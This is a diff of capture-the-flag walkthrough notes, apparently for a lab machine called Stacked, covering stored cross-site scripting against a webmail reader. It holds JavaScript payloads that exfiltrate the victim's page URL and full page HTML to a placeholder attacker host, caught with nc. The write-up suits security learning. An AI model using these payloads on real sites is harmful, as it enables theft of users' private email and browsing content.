@@ -52,7 +52,7 @@ Method 1:
 ```
 - in the victim`s referer, we can see the response is from: "/read-mail.php?id=5"
 
-Method 2(Better):
+Method 2: (better)
 ```javascript
 var exfilreq = new XMLHttpRequest();    
 exfilreq.open("GET", "http://{attackerIP}/" + document.location, false);    
@@ -60,8 +60,8 @@ exfilreq.send();
 ```
 - set above script as payload
 - when we nc at 80, can see the victim`s current page appended.
-- "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1"
-- For victim will visit "http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2"
+- in nc, we get "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1"
+- For victim visited "http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2"
 
 We can even see content the victim is browsing by
 ```javascript
@@ -69,7 +69,7 @@ var exfilreq = new XMLHttpRequest();
 exfilreq.open("POST", "http://{attackerIP}:9001/", false);    
 exfilreq.send(document.documentElement.outerHTML); 
 ```
-
+- then we can open the text in browser, except some CSS or image can not be shown.
 
 ## LocalStack vulnerability
 
